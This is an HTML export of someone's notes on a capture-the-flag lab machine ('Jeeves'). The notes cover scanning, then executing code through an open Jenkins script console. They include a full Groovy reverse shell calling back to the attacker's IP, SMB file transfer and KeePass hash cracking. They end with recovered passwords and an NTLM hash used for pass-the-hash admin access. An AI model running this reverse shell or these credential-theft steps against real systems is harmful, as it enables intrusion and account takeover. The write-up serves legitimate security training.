<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.63 Jeeves</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.63 Jeeves</h1><br/>nmap showed me that 80, 135, 445, 50000 were all open.<br />80 was an up to date IIS server that would send you to a <em>picture</em> of an error page whenever data was entered (rabithole)<br />smb scans of 135 asd 445 gave me nothing<br />50000 was a webserver<br />dirsearch showed me that /askjeeves/ was an available directory (the only one)<br />I could see that I am running jenkins 2.87, (not vulnerale courtesy of my research)<br />Anonnymous login was enabled, so I was able to see “manage jenkins” by default<br />manage jenkins &gt; script console &gt; do the thing!!<br /><br />cmd	= &quot;net user&quot;<br />println(cmd.execute().text)<br />^^we can see that this is running as koehoe (or some shit)<br /><br /><br />String host=&quot;10.10.14.60&quot;;<br />int port=3232;<br />String cmd=&quot;cmd.exe&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br />^^calls back to our nc listener and gives us a shell<br /><a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br />^^respect<br /><br />going to koehoe desktop gives us the user flag<br />koehoe documents shows us a kdbx file!!!!!! (CEH.kdbx) kdbx is a keepass file! if you can get in, it stores creds!!<br /><br />first we have got to get it on the kali...<br />on the kali<br />    smbserver.py yeet `pwd`<br />on the target<br />    net use x: \\10.10.14.60\yeet<br />    x:<br />now you can copy things between machines<br /><br />use keepass2john to get a hash of keepass to crack later<br />    keepass2john CEH.kdbx &gt; keepasshash.txt<br />    #make sure to drop the CEH: part<br />CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48<br /><br />go to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a> to look up example hashes and find the right number (13400 in this case)<br />on host windows machine C:\Users\Squid\Desktop\BruteForce\hashcat-5.1.0&gt;hashcat64.exe -m 13400 yeet\jeeves.txt yeet\rockyou.txt<br />###note### You may have to delete a space from the end of *jeeves.txt*<br />hashcat gives the responce moonshine1<br /><br />now we can open the keepass file!!!<br />useing kali&#39;s keepass2 (or other times keepassx) we can now see the for things!!<br />most helpfully<br />dc recovery         S1TjAtJHKsugh9oC4VZl<br />backup stuff        aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br /><br />winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe<br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe<br /><br />We&#39;ve got a shell!!!!<br /> <br /> <br />Now we need to do some ADS stuff to read root.txt<br />dir -r<br />    hm.txt:root.txt:$DATA<br /><br />powershell (get-content hm.txt -stream root.txt)<br />    afbc5bd4b615a60648cec41c6ac92530<br /><br /><br />YEE-HAW<br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>